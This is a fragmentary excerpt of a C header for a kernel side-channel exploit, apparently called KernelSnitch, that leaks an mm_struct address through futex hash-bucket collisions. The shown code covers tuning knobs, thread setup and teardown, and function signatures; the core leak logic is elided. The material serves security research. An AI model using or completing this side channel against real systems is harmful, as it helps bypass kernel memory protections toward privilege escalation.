...
/* How many colliding addresses the search gathers before it starts. Tuning,
 * not measurement: more costs time and buys confidence. The
 * KSNITCH_COLLISIONS environment variable overrides the compiled-in default
 * at run time (kernelsnitch_collisions_wanted() below), so a device wanting
 * more confidence gets it as a drive-time knob, not a separate build. */
#ifndef KSNITCH_COLLISIONS
#define KSNITCH_COLLISIONS 4
#endif

static inline int kernelsnitch_collisions_wanted(void)
{
	int n = KSNITCH_COLLISIONS;
	const char *e = getenv("KSNITCH_COLLISIONS");
	if (e && *e) {
		int v = atoi(e);
		if (v >= 1)
			n = v;
...
static char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
 ...
 * @arg arg.ks: shared side-channel state
 ...
 * @arg ks: shared side-channel state
...
{
    pthread_t tid;
#ifdef KSNITCH_DETACHED_THREADS
    /* Optional: create the waiting threads detached and with small stacks.
 *
 * Each thread only waits on a futex and never returns a value, so nothing needs
 * to join them. Left joinable, a woken thread becomes an unreaped record whose
 * stack is never released -- which is invisible in a process that exits
 * immediately afterwards, and fatal in one that runs this a second time: the
 * accumulated stacks exhaust the address space and the second run cannot start
 * its threads at all.
 *
 * Off by default, so a consumer that does exit immediately is unaffected. */
    pthread_attr_t attr;
    ...
    for (size_t i = 0; i < amount; ++i) {
        ...
        inc_arg->id = id;
        inc_arg->ks = ks;
        SYSCHK(pthread_create(&tid, &attr, __do_increase, (void *)inc_arg));
    }
 ...
 * @return shared side-channel state
 */
...
/**
 * Retire the __increase threads. Each FUTEX_WAITs forever on ks->inc_futex[id]
 * to hold a hash-bucket chain; after the leak they are dead weight. A caller
 * that exits soon never needs this -- the threads die with the process. A
* consumer that keeps running (in particular one that uses the channel a
* second time) must call it, or the
 * ~APPENDED_FUTEXES threads accumulate until pthread_create runs out of
 * shadow-stack memory. Waking every futex word makes each thread return from
 * __futex, free its own arg, and exit; a woken thread never touches ks again,
 * so this is safe to call right before kernelsnitch_cleanup() unmaps ks.
 */
static inline void kernelsnitch_release_threads(struct kernelsnitch_shared_state *ks)
{
    if (!ks)
        return;
    long woken = 0;
    for (size_t off = 0; off + sizeof(unsigned int) <= KS_PAGE_SIZE;
         off += sizeof(unsigned int)) {
        int w = __futex((unsigned int *)&ks->inc_futex[off], FUTEX_WAKE_PRIVATE,
                        0x7fffffff, NULL, NULL, 0);
        if (w > 0)
            woken += w;
    }
    if (ks->verbose)
        pr_info("released %ld leak threads\n", woken);
    usleep(200000);  /* let the woken threads unwind and exit before cleanup */
}

/**
 * Run the side channel end to end
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 ...
 * @return the found mm_struct or -1 for not found
 */
static inline size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
...
/**
 * Print the current state of the side channel
 * @arg ks: shared side-channel state
 */
static inline void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
{
 ...
 * @arg ks: shared side-channel state
 */
static inline void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
{
    pr_info("collisions:\n");
 ...
 */
static inline size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
{
